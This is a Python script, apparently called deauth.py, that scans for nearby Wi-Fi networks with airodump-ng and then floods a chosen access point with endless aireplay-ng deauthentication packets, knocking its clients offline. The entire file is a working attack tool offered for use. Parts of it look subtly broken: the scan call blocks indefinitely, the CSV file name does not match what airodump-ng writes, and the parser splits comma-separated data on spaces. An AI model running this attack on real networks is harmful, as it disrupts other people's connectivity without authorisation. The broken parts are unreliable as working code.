#!/usr/bin/env python3

import subprocess
import sys
import time
import os

def check_interface(interface):
    try:
        result = subprocess.check_output(['ip', 'link', 'show', interface], stderr=subprocess.STDOUT)
        if interface not in result.decode('utf-8'):
            print(f"[ERROR] Interface {interface} does not exist.")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to check interface: {e}")
        sys.exit(1)

def set_monitor_mode(interface):
    try:
        subprocess.check_call(['sudo', 'ip', 'link', 'set', interface, 'down'])
        subprocess.check_call(['sudo', 'iw', 'dev', interface, 'set', 'type', 'monitor'])
        subprocess.check_call(['sudo', 'ip', 'link', 'set', interface, 'up'])
        print(f"[INFO] Interface {interface} set to monitor mode.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to set monitor mode: {e}")
        sys.exit(1)

def restore_managed_mode(interface):
    try:
        subprocess.check_call(['sudo', 'ip', 'link', 'set', interface, 'down'])
        subprocess.check_call(['sudo', 'iw', 'dev', interface, 'set', 'type', 'managed'])
        subprocess.check_call(['sudo', 'ip', 'link', 'set', interface, 'up'])
        print(f"[INFO] Interface {interface} restored to managed mode.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to restore managed mode: {e}")
        sys.exit(1)

def scan_networks(interface, output_file='/tmp/airodump_output.csv', duration=60):
    print("[INFO] Scanning for networks...")
    try:
        subprocess.check_call(['sudo', 'airodump-ng', '--write', output_file, '--output-format', 'csv', interface])
        time.sleep(duration)
        subprocess.check_call(['sudo', 'pkill', 'airodump-ng'])
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to scan networks: {e}")
        sys.exit(1)

def parse_networks(output_file):
    networks = []
    try:
        with open(output_file, 'r') as file:
            for line in file:
                if "BSSID" in line:
                    continue
                if len(line.strip()) > 0:
                    columns = line.split()
                    if len(columns) > 1:
                        networks.append(columns[0])
    except FileNotFoundError as e:
        print(f"[ERROR] Output file not found: {e}")
        sys.exit(1)
    return networks

def deauth_bssid(interface, bssid, channel):
    try:
        set_monitor_mode(interface)
        print(f"[INFO] Changing to channel {channel}...")
        subprocess.check_call(['sudo', 'iw', 'dev', interface, 'set', 'channel', str(channel)])
        print(f"[INFO] Starting deauth attack on BSSID {bssid}...")
        while True:
            try:
                subprocess.check_call(['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, interface])
            except subprocess.CalledProcessError:
                print(f"[ERROR] Failed to deauth network: {bssid}")
                sys.exit(1)
            time.sleep(1)
    finally:
        restore_managed_mode(interface)

def main():
    if len(sys.argv) < 2:
        print("Usage: sudo python3 deauth.py [--scan | --deauth]")
        sys.exit(1)

    if sys.argv[1] == '--scan':
        interface = input("Enter the network interface (e.g., wlan0): ")
        check_interface(interface)
        scan_networks(interface)
        networks = parse_networks('/tmp/airodump_output.csv')
        if not networks:
            print("[ERROR] No networks found.")
            sys.exit(1)
        print("[INFO] Available Networks:")
        for i, network in enumerate(networks):
            print(f"{i+1}. {network}")
        choice = int(input("Select a network by number: "))
        if 0 < choice <= len(networks):
            bssid = networks[choice-1]
            channel = int(input("Enter the channel of the target network: "))
            deauth_bssid(interface, bssid, channel)
        else:
            print("[ERROR] Invalid choice.")
            sys.exit(1)

    elif sys.argv[1] == '--deauth':
        bssid = input("Enter the BSSID of the target network: ")
        channel = int(input("Enter the channel of the target network: "))
        interface = input("Enter the network interface (e.g., wlan0): ")
        check_interface(interface)
        deauth_bssid(interface, bssid, channel)

    else:
        print("Usage: sudo python3 deauth.py [--scan | --deauth]")
        sys.exit(1)

if __name__ == "__main__":
    main()

